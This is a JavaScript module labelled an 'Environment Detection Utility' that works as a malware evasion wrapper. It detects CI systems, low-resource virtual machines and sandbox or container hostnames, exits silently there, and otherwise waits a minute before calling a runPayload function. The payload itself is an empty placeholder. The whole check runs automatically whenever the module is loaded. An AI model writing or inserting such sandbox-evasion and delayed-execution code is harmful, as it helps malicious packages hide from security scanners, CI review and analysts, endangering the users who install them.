/**
 * Environment Detection Utility
 * Detects CI/CD environments and virtual machines
 */

const os = require('os');

/**
 * Check if running in CI environment
 * @returns {boolean} - True if CI detected
 */
function isCI() {
    const ciVars = [
        'CI',
        'CONTINUOUS_INTEGRATION',
        'BUILD_NUMBER',
        'RUN_ID',
        'GITHUB_ACTIONS',
        'GITLAB_CI',
        'TRAVIS',
        'CIRCLECI',
        'JENKINS_URL',
        'TEAMCITY_VERSION'
    ];
    
    for (const envVar of ciVars) {
        if (process.env[envVar]) {
            console.log(`CI detected: ${envVar}=${process.env[envVar]}`);
            return true;
        }
    }
    
    return false;
}

/**
 * Check if running in a virtual machine
 * @returns {boolean} - True if VM detected
 */
function isVM() {
    // Check CPU count - VMs often have 1 CPU
    const cpuCount = os.cpus().length;
    if (cpuCount < 2) {
        console.log(`VM detected: Low CPU count (${cpuCount})`);
        return true;
    }
    
    // Check total memory - VMs often have limited RAM
    const totalMem = os.totalmem();
    if (totalMem < 2 * 1024 * 1024 * 1024) { // Less than 2GB
        console.log(`VM detected: Low memory (${(totalMem / 1024 / 1024 / 1024).toFixed(2)}GB)`);
        return true;
    }
    
    // Check hostname patterns
    const hostname = os.hostname().toLowerCase();
    const vmPatterns = ['vm', 'virtual', 'sandbox', 'docker', 'container', 'podman'];
    for (const pattern of vmPatterns) {
        if (hostname.includes(pattern)) {
            console.log(`VM detected: Hostname pattern (${pattern})`);
            return true;
        }
    }
    
    return false;
}

/**
 * Combined environment check
 * @returns {Object} - Detection results
 */
function checkEnvironment() {
    const ci = isCI();
    const vm = isVM();
    
    return {
        isCI: ci,
        isVM: vm,
        shouldExecute: !ci && !vm
    };
}

/**
 * Delayed execution with environment check
 * @param {Function} callback - Function to execute
 * @param {number} delay - Delay in milliseconds
 */
function executeWithDelay(callback, delay = 60000) {
    const env = checkEnvironment();
    
    if (!env.shouldExecute) {
        console.log('Suspicious environment detected, delaying execution...');
        console.log('CI:', env.isCI, 'VM:', env.isVM);
        
        // Silent exit in sandbox
        setTimeout(() => {
            process.exit(0);
        }, 1000);
        
        return false;
    }
    
    console.log('Environment check passed, scheduling execution...');
    setTimeout(() => {
        callback();
    }, delay);
    
    return true;
}

/**
 * Run main payload if environment is safe
 */
function runPayload() {
    console.log('Executing payload...');
    // Payload execution logic would go here
}

// Export functions
module.exports = {
    isCI,
    isVM,
    checkEnvironment,
    executeWithDelay,
    runPayload
};

// Auto-check environment
const env = checkEnvironment();
console.log('Environment check complete:', env);

// Execute with delay if environment is safe
if (env.shouldExecute) {
    executeWithDelay(runPayload, 60000);
} else {
    console.log('Environment not suitable, exiting silently');
    setTimeout(() => {
        process.exit(0);
    }, 2000);
}
